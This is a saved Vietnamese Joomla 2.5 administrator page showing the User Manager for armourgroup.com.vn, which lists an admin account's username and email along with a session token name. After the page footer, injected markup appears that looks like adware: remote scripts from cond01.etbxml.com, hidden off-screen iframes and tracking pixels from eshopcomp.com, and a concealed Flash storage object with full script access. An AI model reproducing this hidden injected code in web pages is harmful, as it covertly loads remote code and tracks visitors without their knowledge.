                    <li class="node"><a href="index.php?option=com_menus&amp;view=items&amp;menutype=top"
                                        class="icon-16-menu">Top</a>
                        <ul class="menu-component" id="menu-com-menus-items-top">
                            <li><a href="index.php?option=com_menus&amp;view=item&amp;layout=edit&amp;menutype=top"
                                   class="icon-16-newarticle">Thêm danh mục mới</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_menus&amp;view=items&amp;menutype=mainmenu"
                                        class="icon-16-menu">Main Menu <span><img title="Trang chủ" alt="*"
                                                                                  src="/images/icon-16-default.png"></span></a>
                        <ul class="menu-component" id="menu-com-menus-items-mainmenu">
                            <li><a href="index.php?option=com_menus&amp;view=item&amp;layout=edit&amp;menutype=mainmenu"
                                   class="icon-16-newarticle">Thêm danh mục mới</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_menus&amp;view=items&amp;menutype=menu-vn"
                                        class="icon-16-menu">Menu-VN <span><img title="VietNam (VN)" alt="*vi*"
                                                                                src="/images/vi.gif"></span></a>
                        <ul class="menu-component" id="menu-com-menus-items-menu-vn">
                            <li><a href="index.php?option=com_menus&amp;view=item&amp;layout=edit&amp;menutype=menu-vn"
                                   class="icon-16-newarticle">Thêm danh mục mới</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_menus&amp;view=items&amp;menutype=menu-en"
                                        class="icon-16-menu">Menu-EN <span><img title="English (UK)" alt="*en*"
                                                                                src="/images/en.gif"></span></a>
                        <ul class="menu-component" id="menu-com-menus-items-menu-en">
                            <li><a href="index.php?option=com_menus&amp;view=item&amp;layout=edit&amp;menutype=menu-en"
                                   class="icon-16-newarticle">Thêm danh mục mới</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li class="node"><a href="#">Nội dung</a>
                <ul>
                    <li class="node"><a href="index.php?option=com_content" class="icon-16-article">Quản lý bài viết</a>
                        <ul class="menu-component" id="menu-com-content">
                            <li><a href="index.php?option=com_content&amp;task=article.add" class="icon-16-newarticle">Viết
                                    bài mới</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_categories&amp;extension=com_content"
                                        class="icon-16-category">Quản lý thể loại</a>
                        <ul class="menu-component" id="menu-com-categories-com-content">
                            <li>
                                <a href="index.php?option=com_categories&amp;task=category.add&amp;extension=com_content"
                                   class="icon-16-newarticle">Thêm thể loại mới</a></li>
                        </ul>
                    </li>
                    <li><a href="index.php?option=com_content&amp;view=featured" class="icon-16-featured">Bài viết nổi
                            bật</a></li>
                    <li class="separator"><span></span></li>
                    <li><a href="index.php?option=com_media" class="icon-16-media">Quản lý phương tiện</a></li>
                </ul>
            </li>
            <li class="node"><a href="#">Mở rộng</a>
                <ul>
                    <li><a href="index.php?option=com_joomlaupdate" class="icon-16-joomlaupdate">Cập nhật phiên bản</a>
                    </li>
                    <li><a href="index.php?option=com_virtuemart" class="icon-16-menu_icon">Chợ điện tử</a></li>
                    <li class="node"><a href="index.php?option=com_jckman" class="icon-16-jcklogo">JCK Manager</a>
                        <ul class="menu-component" id="menu-com-jckman">
                            <li><a href="index.php?option=com_jckman&amp;controller=cpanel"
                                   class="icon-16-icon-16-cpanel">Control Panel</a></li>
                            <li><a href="index.php?option=com_jckman&amp;controller=Install"
                                   class="icon-16-icon-16-installer">Installer</a></li>
                            <li><a href="index.php?option=com_jckman&amp;controller=list"
                                   class="icon-16-icon-16-pluginmanager">Plugin Manager</a></li>
                            <li><a href="index.php?option=com_jckman&amp;controller=toolbars"
                                   class="icon-16-icon-16-layout">Layout Manager</a></li>
                            <li><a href="index.php?option=com_jckman&amp;controller=import"
                                   class="icon-16-icon-16-restore">Restore Backup</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_contact" class="icon-16-contact">Liên hệ</a>
                        <ul class="menu-component" id="menu-com-contact">
                            <li><a href="index.php?option=com_contact" class="icon-16-contact">Liên hệ</a></li>
                            <li><a href="index.php?option=com_categories&amp;extension=com_contact"
                                   class="icon-16-contact-cat">Thể loại</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_weblinks" class="icon-16-weblinks">Liên kết
                            website</a>
                        <ul class="menu-component" id="menu-com-weblinks">
                            <li><a href="index.php?option=com_weblinks" class="icon-16-weblinks">Liên kết</a></li>
                            <li><a href="index.php?option=com_categories&amp;extension=com_weblinks"
                                   class="icon-16-weblinks-cat">Thể loại</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_banners" class="icon-16-banners">Quảng cáo</a>
                        <ul class="menu-component" id="menu-com-banners">
                            <li><a href="index.php?option=com_banners" class="icon-16-banners">Quảng cáo</a></li>
                            <li><a href="index.php?option=com_categories&amp;extension=com_banners"
                                   class="icon-16-banners-cat">Thể loại</a></li>
                            <li><a href="index.php?option=com_banners&amp;view=clients" class="icon-16-banners-clients">Khách
                                    hàng</a></li>
                            <li><a href="index.php?option=com_banners&amp;view=tracks" class="icon-16-banners-tracks">Theo
                                    dõi</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_messages" class="icon-16-messages">Quản lý Tin
                            nhắn</a>
                        <ul class="menu-component" id="menu-com-messages">
                            <li><a href="index.php?option=com_messages&amp;task=message.add"
                                   class="icon-16-messages-add">Viết tin nhắn</a></li>
                            <li><a href="index.php?option=com_messages" class="icon-16-messages-read">Đọc tin nhắn</a>
                            </li>
                        </ul>
                    </li>
                    <li><a href="index.php?option=com_redirect" class="icon-16-redirect">Redirect</a></li>
                    <li><a href="index.php?option=com_search" class="icon-16-search">Tìm kiếm</a></li>
                    <li><a href="index.php?option=com_finder" class="icon-16-finder">Tìm kiếm thông minh</a></li>
                    <li class="node"><a href="index.php?option=com_newsfeeds" class="icon-16-newsfeeds">Tin tức RRS</a>
                        <ul class="menu-component" id="menu-com-newsfeeds">
                            <li><a href="index.php?option=com_newsfeeds" class="icon-16-newsfeeds">Feeds</a></li>
                            <li><a href="index.php?option=com_categories&amp;extension=com_newsfeeds"
                                   class="icon-16-newsfeeds-cat">Các Chủ đề con</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li class="node"><a href="#">Tiện ích mở rộng</a>
                <ul>
                    <li><a href="index.php?option=com_installer" class="icon-16-install">Quản lý phần mở rộng</a></li>
                    <li class="separator"><span></span></li>
                    <li><a href="index.php?option=com_modules" class="icon-16-module">Quản lý Module</a></li>
                    <li><a href="index.php?option=com_plugins" class="icon-16-plugin">Quản lý Plug-in</a></li>
                    <li><a href="index.php?option=com_templates" class="icon-16-themes">Quản lý giao diện</a></li>
                    <li><a href="index.php?option=com_languages" class="icon-16-language">Quản lý ngôn ngữ</a></li>
                </ul>
            </li>
            <li class="node"><a href="#">Trợ giúp</a>
                <ul>
                    <li><a href="index.php?option=com_admin&amp;view=help" class="icon-16-help">Trợ giúp</a></li>
                    <li class="separator"><span></span></li>
                    <li><a target="_blank" href="http://forum.joomla.org" class="icon-16-help-forum">Diễn đàn hỗ trợ
                            chính thức</a></li>
                    <li><a target="_blank" href="http://docs.joomla.org" class="icon-16-help-docs">Tài liệu tham
                            khảo</a></li>
                    <li class="separator"><span></span></li>
                    <li class="node"><a href="#" class="icon-16-weblinks">Liên kết hữu ích</a>
                        <ul class="menu-component">
                            <li><a target="_blank" href="http://extensions.joomla.org" class="icon-16-help-jed">Tiện ích
                                    mở rộng</a></li>
                            <li><a target="_blank" href="http://community.joomla.org/translations.html"
                                   class="icon-16-help-trans">Các bản dịch cho joomla</a></li>
                            <li><a target="_blank" href="http://resources.joomla.org" class="icon-16-help-jrd">Tài
                                    nguyên Joomla</a></li>
                            <li><a target="_blank" href="http://community.joomla.org" class="icon-16-help-community">Trang
                                    cộng đồng</a></li>
                            <li><a target="_blank" href="http://developer.joomla.org/security.html"
                                   class="icon-16-help-security">Trung tâm an ninh</a></li>
                            <li><a target="_blank" href="http://developer.joomla.org" class="icon-16-help-dev">Nhà phát
                                    triển tài nguyên</a></li>
                            <li><a target="_blank" href="http://shop.joomla.org" class="icon-16-help-shop">Joomla
                                    hop</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
        </ul>

    </div>
    <div id="module-status">
        <span class="loggedin-users">0 Khách thăm</span><span class="backloggedin-users">1 Admin</span><span
            class="no-unread-messages"><a href="/administrator/index.php?option=com_messages">0</a></span>
        <span class="viewsite"><a target="_blank" href="http://armourgroup.com.vn/">Xem trang web</a></span><span
            class="logout"><a
                href="/administrator/index.php?option=com_login&amp;task=logout&amp;269decaa349eea77e5cac1e5405dfc2e=1">Đăng
                xuất</a></span></div>
    <div class="clr"></div>
</div>

<div id="content-box">
<div id="toolbar-box">
    <div class="m">
        <div id="toolbar" class="toolbar-list">
            <ul>
                <li id="toolbar-new" class="button">
                    <a class="toolbar" onclick="Joomla.submitbutton('user.add')" href="#">
<span class="icon-32-new">
</span>
                        Thêm mới
                    </a>
                </li>

                <li id="toolbar-edit" class="button">
                    <a class="toolbar"
                       onclick="if (document.adminForm.boxchecked.value==0){alert('Please first make a selection from the list');}else{ Joomla.submitbutton('user.edit')}"
                       href="#">
<span class="icon-32-edit">
</span>
                        Sửa
                    </a>
                </li>

                <li class="divider">
                </li>

                <li id="toolbar-publish" class="button">
                    <a class="toolbar"
                       onclick="if (document.adminForm.boxchecked.value==0){alert('Please first make a selection from the list');}else{ Joomla.submitbutton('users.activate')}"
                       href="#">
<span class="icon-32-publish">
</span>
                        Kích hoạt
                    </a>
                </li>

                <li id="toolbar-unpublish" class="button">
                    <a class="toolbar"
                       onclick="if (document.adminForm.boxchecked.value==0){alert('Please first make a selection from the list');}else{ Joomla.submitbutton('users.block')}"
                       href="#">
<span class="icon-32-unpublish">
</span>
                        Khóa
                    </a>
                </li>

                <li id="toolbar-unblock" class="button">
                    <a class="toolbar"
                       onclick="if (document.adminForm.boxchecked.value==0){alert('Please first make a selection from the list');}else{ Joomla.submitbutton('users.unblock')}"
                       href="#">
<span class="icon-32-unblock">
</span>
                        Thôi khóa
                    </a>
                </li>

                <li class="divider">
                </li>

                <li id="toolbar-delete" class="button">
                    <a class="toolbar"
                       onclick="if (document.adminForm.boxchecked.value==0){alert('Please first make a selection from the list');}else{ Joomla.submitbutton('users.delete')}"
                       href="#">
<span class="icon-32-delete">
</span>
                        Xóa
                    </a>
                </li>

                <li class="divider">
                </li>

                <li id="toolbar-popup-options" class="button">
                    <a rel="{handler: 'iframe', size: {x: 875, y: 550}, onClose: function() {}}"
                       href="http://armourgroup.com.vn/administrator/index.php?option=com_config&amp;view=component&amp;component=com_users&amp;path=&amp;tmpl=component"
                       class="modal">
<span class="icon-32-options">
</span>
                        Tùy chọn
                    </a>
                </li>

                <li class="divider">
                </li>

                <li id="toolbar-help" class="button">
                    <a class="toolbar" rel="help"
                       onclick="Joomla.popupWindow('http://help.joomla.org/proxy/index.php?option=com_help&amp;keyref=Help25:Users_User_Manager', 'Trợ giúp', 700, 500, 1)"
                       href="#">
<span class="icon-32-help">
</span>
                        Trợ giúp
                    </a>
                </li>

            </ul>
            <div class="clr"></div>
        </div>
        <div class="pagetitle icon-48-user"><h2>Quản lý Người dùng: Người dùng</h2></div>
    </div>
</div>
<div id="submenu-box">
    <div class="m">
        <ul id="submenu">
            <li>
                <a href="index.php?option=com_users&amp;view=users" class="active">Thành viên</a></li>
            <li>
                <a href="index.php?option=com_users&amp;view=groups">Nhóm Thành viên</a></li>
            <li>
                <a href="index.php?option=com_users&amp;view=levels">Xem cấp độ truy cập</a></li>
            <li>
                <a href="index.php?option=com_users&amp;view=notes">Người sử dụng Ghi chú</a></li>
            <li>
                <a href="index.php?option=com_categories&amp;extension=com_users">Lưu ý danh mục</a></li>
        </ul>
        <div class="clr"></div>
    </div>
</div>


<div id="system-message-container">
</div>
<div id="element-box">
<div class="m">

    <form id="adminForm" name="adminForm" method="post"
          action="/administrator/index.php?option=com_users&amp;view=users">
        <fieldset id="filter-bar">
            <div class="filter-search fltlft">
                <label for="filter_search" class="filter-search-lbl">Tìm thành viên</label>
                <input type="text" title="Tìm thành viên" value="" id="filter_search" name="filter_search">
                <button type="submit">Tìm kiếm</button>
                <button onclick="document.id('filter_search').value='';this.form.submit();" type="button">Thiết lập
                    lại
                </button>
            </div>
            <div class="filter-select fltrt">
                <label for="filter_state">
                    Lọc người dùng theo:&nbsp;            </label>

                <select onchange="this.form.submit()" class="inputbox" name="filter_state">
                    <option value="*">- State -</option>
                    <option value="0">Bật</option>
                    <option value="1">Vô hiệu hóa</option>
                </select>

                <select onchange="this.form.submit()" class="inputbox" name="filter_active">
                    <option value="*">- Active -</option>
                    <option value="0">Kích hoạt</option>
                    <option value="1">Không kích hoạt</option>
                </select>

                <select onchange="this.form.submit()" class="inputbox" name="filter_group_id">
                    <option value="">- Nhóm -</option>
                    <option value="1">Public</option>
                    <option value="6">- Manager</option>
                    <option value="7">- - Administrator</option>
                    <option value="2">- Registered</option>
                    <option value="3">- - Author</option>
                    <option value="4">- - - Editor</option>
                    <option value="5">- - - - Publisher</option>
                    <option value="10">- - - Shop Suppliers (Example)</option>
                    <option value="12">- - Customer Group (Example)</option>
                    <option value="8">- Super Users</option>
                </select>

                <select onchange="this.form.submit()" class="inputbox" id="filter_range" name="filter_range">
                    <option value="">- Ngày đăng ký -</option>
                    <option value="today">hôm nay</option>
                    <option value="past_week">Trong tuần qua</option>
                    <option value="past_1month">Trong tháng vừa qua</option>
                    <option value="past_3month">Trong 3 tháng qua</option>
                    <option value="past_6month">Trong 6 tháng qua</option>
                    <option value="past_year">Trong năm qua</option>
                    <option value="post_year">Hơn một năm trước đây</option>
                </select>
            </div>
        </fieldset>
        <div class="clr"></div>

        <table class="adminlist">
            <thead>
            <tr>
                <th width="1%">
                    <input type="checkbox" onclick="Joomla.checkAll(this)" title="Chọn tất cả" value=""
                           name="checkall-toggle">
                </th>
                <th class="left">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.name','desc','');return false;" href="#">Tên<img alt=""
                                                                                                         src="/images/sort_asc.png"></a>
                </th>
                <th width="10%" class="nowrap">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.username','asc','');return false;" href="#">Tên người dùng</a>
                </th>
                <th width="5%" class="nowrap">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.block','asc','');return false;" href="#">Bật</a></th>
                <th width="5%" class="nowrap">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.activation','asc','');return false;" href="#">Kích hoạt</a></th>
                <th width="10%" class="nowrap">
                    Nhóm thành viên
                </th>
                <th width="15%" class="nowrap">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.email','asc','');return false;" href="#">Email</a></th>
                <th width="10%" class="nowrap">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.lastvisitDate','asc','');return false;" href="#">Lần đăng nhập
                        mới ngày</a></th>
                <th width="10%" class="nowrap">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.registerDate','asc','');return false;" href="#">Ngày đăng ký</a>
                </th>
                <th width="3%" class="nowrap">
                    <a title="Nhấn vào đây để sắp xếp theo cột"
                       onclick="Joomla.tableOrdering('a.id','asc','');return false;" href="#">ID</a></th>
            </tr>
            </thead>
            <tfoot>
            <tr>
                <td colspan="15">
                    <div class="container">
                        <div class="pagination">

                            <div class="limit">Hiển thị #<select onchange="Joomla.submitform();" size="1"
                                                                 class="inputbox" name="limit" id="limit">
                                    <option value="5">5</option>
                                    <option value="10">10</option>
                                    <option value="15">15</option>
                                    <option selected="selected" value="20">20</option>
                                    <option value="25">25</option>
                                    <option value="30">30</option>
                                    <option value="50">50</option>
                                    <option value="100">100</option>
                                    <option value="0">Tất cả</option>
                                </select>
                            </div>
                            <div class="limit"></div>
                            <input type="hidden" value="0" name="limitstart">
                        </div>
                    </div>
                </td>
            </tr>
            </tfoot>
            <tbody>
            <tr class="row0">
                <td class="center">
                    <input type="checkbox" title="Ô chọn cho hàng 1" onclick="Joomla.isChecked(this.checked);"
                           value="115" name="cid[]" id="cb0"></td>
                <td>
                    <div class="fltrt">
                        <a href="/administrator/?option=com_users&amp;view=notes&amp;filter_search=uid:115"><img
                                title="COM_USERS_FILTER_NOTES" alt="COM_USERS_NOTES"
                                src="/images/filter_16.png"></a> <a
                            rel="{handler: 'iframe', size: {x: 800, y: 450}}"
                            href="/administrator/index.php?option=com_users&amp;view=notes&amp;tmpl=component&amp;layout=modal&amp;u_id=115"
                            class="modal"><img title="Hiển thị 3 ghi chú" alt="COM_USERS_NOTES"
                                               src="/images/icon-16-user-note.png"></a>
                        <a href="/administrator/index.php?option=com_users&amp;task=note.add&amp;u_id=115"><img
                                title="Thêm một ghi chú" alt="COM_USERS_NOTES"
                                src="/images/note_add_16.png"></a></div>
                    <a title="Chỉnh sửa Người dùng duyquang"
                       href="/administrator/index.php?option=com_users&amp;task=user.edit&amp;id=115">
                        duyquang</a>
                </td>
                <td class="center">
                    duyquang
                </td>
                <td class="center">
                    <a href="#toggle" rel="{id:'cb0', task:'users.block'}" title="" class="grid_true hasTip"></a></td>
                <td class="center">
                    <a class="grid_true"></a></td>
                <td class="center">
                    Manager
                </td>
                <td class="center">
                    abc@gmail.com
                </td>
                <td class="center">
                    2015-03-09 07:39:14
                </td>
                <td class="center">
                    2015-02-28 08:39:53
                </td>
                <td class="center">
                    115
                </td>
            </tr>
            <tr class="row1">
                <td class="center">
                    <input type="checkbox" title="Ô chọn cho hàng 2" onclick="Joomla.isChecked(this.checked);"
                           value="114" name="cid[]" id="cb1"></td>
                <td>
                    <div class="fltrt">
                        <a href="/administrator/index.php?option=com_users&amp;task=note.add&amp;u_id=114"><img
                                title="Thêm một ghi chú" alt="COM_USERS_NOTES"
                                src="/images/note_add_16.png"></a></div>
                    <a title="Chỉnh sửa Người dùng Super User"
                       href="/administrator/index.php?option=com_users&amp;task=user.edit&amp;id=114">
                        Super User</a>
                </td>
                <td class="center">
                    admin
                </td>
                <td class="center">
                    <a class="grid_true"></a></td>
                <td class="center">
                    <a class="grid_true"></a></td>
                <td class="center">
                    Super Users
                </td>
                <td class="center">
                    duyquang1202@gmail.com
                </td>
                <td class="center">
                    2015-04-28 01:24:03
                </td>
                <td class="center">
                    2013-11-17 03:22:28
                </td>
                <td class="center">
                    114
                </td>
            </tr>
            </tbody>
        </table>

        <fieldset class="batch">
            <legend>Hàng loạt quá trình người dùng được lựa chọn</legend>
            <label for="batch-choose-action" id="batch-choose-action-lbl">Chọn Nhóm</label>
            <fieldset class="combo" id="batch-choose-action">
                <select id="batch-group-id" class="inputbox" name="batch[group_id]">
                    <option value="">Lựa chọn</option>
                    <option value="1">Public</option>
                    <option value="6">- Manager</option>
                    <option value="7">- - Administrator</option>
                    <option value="2">- Registered</option>
                    <option value="3">- - Author</option>
                    <option value="4">- - - Editor</option>
                    <option value="5">- - - - Publisher</option>
                    <option value="10">- - - Shop Suppliers (Example)</option>
                    <option value="12">- - Customer Group (Example)</option>
                    <option value="8">- Super Users</option>
                </select>

                <input type="radio" checked="checked" value="add" id="batch[group_action]add"
                       name="batch[group_action]">
                <label class="radiobtn" id="batch[group_action]add-lbl" for="batch[group_action]add">Thêm nhóm thành
                    viên</label>
                <input type="radio" value="del" id="batch[group_action]del" name="batch[group_action]">
                <label class="radiobtn" id="batch[group_action]del-lbl" for="batch[group_action]del">Xóa khỏi
                    nhóm</label>
                <input type="radio" value="set" id="batch[group_action]set" name="batch[group_action]">
                <label class="radiobtn" id="batch[group_action]set-lbl" for="batch[group_action]set">Đưa vào
                    nhóm</label>
            </fieldset>

            <button onclick="Joomla.submitbutton('user.batch');" type="submit">
                Quy trình
            </button>
            <button onclick="document.id('batch-group-id').value=''" type="button">
                Xóa
            </button>
        </fieldset>

        <div>
            <input type="hidden" value="" name="task">
            <input type="hidden" value="0" name="boxchecked">
            <input type="hidden" value="a.name" name="filter_order">
            <input type="hidden" value="asc" name="filter_order_Dir">
            <input type="hidden" value="1" name="269decaa349eea77e5cac1e5405dfc2e"></div>
    </form>

    <div class="clr"></div>
</div>
</div>
<noscript>
    Cảnh báo! JavaScript phải được kích hoạt cho hoạt động thích hợp của các phụ trợ quản trị.
</noscript>
</div>

<!-- <p align="center">Joomla! 2.5.16</p> -->
<div id="footer">
    <p class="copyright">
        <a href="/">www.armougroup.com.vn</a> Copyright 2014 by Trieu Phu Co.,LDT
    </p>
</div>


<div id="sbox-overlay" aria-hidden="true" style="z-index: 65555; opacity: 0;" tabindex="-1"></div>
<div id="sbox-window" role="dialog" aria-hidden="true" style="z-index: 65557;" class="shadow">
    <div id="sbox-content" style="opacity: 0;"></div>
    <a id="sbox-btn-close" href="#" role="button" aria-controls="sbox-window"></a></div>
<div id="__fghjktghndfgt_once" style="display:none;"></div>
<div id="__if72ru4sdfsdfrkjahiuyi_once" style="display:none;"></div>
<div id="__if72ru4sdfsdfruh7fewui_once" style="display:none;"></div>
<div id="__hggasdgjhsagd_once" style="display:none;"></div>
<script
    src="//cond01.etbxml.com/api/web/hotels.php?ui=1&amp;partner=first_t_t&amp;ns=first_t_t&amp;mamId=first_t_t&amp;userId=2222&amp;appId=3333&amp;sp=0&amp;apps=Targeted"></script>
<img style="z-index: -100; position: absolute; left: 0px; top: 0px;"
     src="https://secure.adnxs.com/seg?add=2735784&amp;t=2?" class="nxywfqgzlujutadonwen">
<script
    src="//cond01.etbxml.com/api/web/hotels.php?ui=1&amp;partner=first_t_t&amp;ns=first_t_t&amp;mamId=first_t_t&amp;userId=2222&amp;appId=3333&amp;sp=0&amp;apps=Targeted"></script>
<img style="z-index: -100; position: absolute; left: 0px; top: 0px;"
     src="https://secure.adnxs.com/seg?add=2735784&amp;t=2?" class="nxywfqgzlujutadonwen"><img
    style="z-index: -100; position: absolute; left: 0px; top: 0px;"
    src="https://secure.adnxs.com/seg?add=2735784&amp;t=2?" class="nxywfqgzlujutadonwen">
<iframe id="119536873dcfc889" src="//pstatic.eshopcomp.com/nwp/v0_0_525/release/Store.html"
        style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;"
        class="ver6051099"></iframe>
<iframe id="37799923a996612a" src="//pstatic.eshopcomp.com/nwp/v0_0_525/release/Store.html"
        style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;"
        class="ver587125"></iframe>
<iframe id="8944e22d7476a743" src="//pstatic.eshopcomp.com/nwp/v0_0_525/release/Store.html"
        style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;"
        class="ver3448391"></iframe>
<img style="z-index: -100; position: absolute; left: 0px; top: 0px;"
     src="//app.eshopcomp.com/a/usr/logo.png?t=2015328&amp;usertype=generated&amp;hid=AF75EAEE-8825-4BC6-903F-2D1458B98F33&amp;partid=wp&amp;subid=1272_20726"><img
    style="z-index: -100; position: absolute; left: 0px; top: 0px;"
    src="//app.eshopcomp.com/a/usr/logo.png?t=2015328&amp;usertype=generated&amp;hid=66BC1595-B421-46F0-AF4C-9C2D0678774B&amp;partid=wpnewbs&amp;subid=731_20726"><img
    style="z-index: -100; position: absolute; left: 0px; top: 0px;"
    src="//app.eshopcomp.com/a/usr/logo.png?t=2015328&amp;usertype=generated&amp;hid=9AD0192D-D9E5-48F0-B0D3-DFD7DE4F668F&amp;partid=wp&amp;subid=1272_20726">

<div id="SwfStore_coradvisor_com_0" style="position: absolute; top: -2000px; left: -2000px;">
    <object width="500" height="100" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="SwfStore_coradvisor_com_1"
            codebase="https://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
        <param name="movie" value="http://www.comparinggenie.com/scripts/storage.swf?v=0.033">
        <param name="FlashVars" value="namespace=coradvisor_com">
        <param name="allowScriptAccess" value="always">
        <embed width="500" height="375" align="middle" src="http://www.comparinggenie.com/scripts/storage.swf?v=0.033"
               bgcolor="#ffffff" name="SwfStore_coradvisor_com_1" play="true" loop="false" quality="high"
               allowscriptaccess="always" type="application/x-shockwave-flash" flashvars="namespace=coradvisor_com"
               pluginspage="https://www.macromedia.com/go/getflashplayer">
    </object>
</div>
</body>
</html>